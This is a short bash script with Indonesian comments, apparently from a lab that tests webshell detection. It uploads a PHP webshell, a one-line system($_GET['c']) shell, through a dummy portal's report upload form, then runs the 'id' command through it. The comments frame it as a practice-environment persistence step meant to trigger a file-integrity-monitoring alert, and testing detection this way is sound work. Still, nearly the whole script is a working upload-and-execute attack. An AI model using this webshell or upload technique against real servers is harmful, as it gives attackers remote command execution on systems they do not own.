#!/usr/bin/env bash
# Persistensi: unggah webshell lewat form laporan portal dummy (memicu R09 Webshell
# lewat FIM), lalu jalankan satu perintah tak berbahaya (id) melaluinya.
TARGET="${1:-172.30.0.11}"
cat > /tmp/laporan-warga.php <<'PHP'
<?php /* webshell LINGKUNGAN LATIHAN */ if (isset($_GET['c'])) { system($_GET['c']); } ?>
PHP
echo "Mengunggah webshell ke http://$TARGET/upload.php ..."
curl -s -F "lampiran=@/tmp/laporan-warga.php" "http://$TARGET/upload.php" | grep -o 'Laporan diterima[^<]*'
sleep 3
echo "Menjalankan perintah 'id' lewat webshell:"
curl -s "http://$TARGET/uploads/laporan-warga.php?c=id"
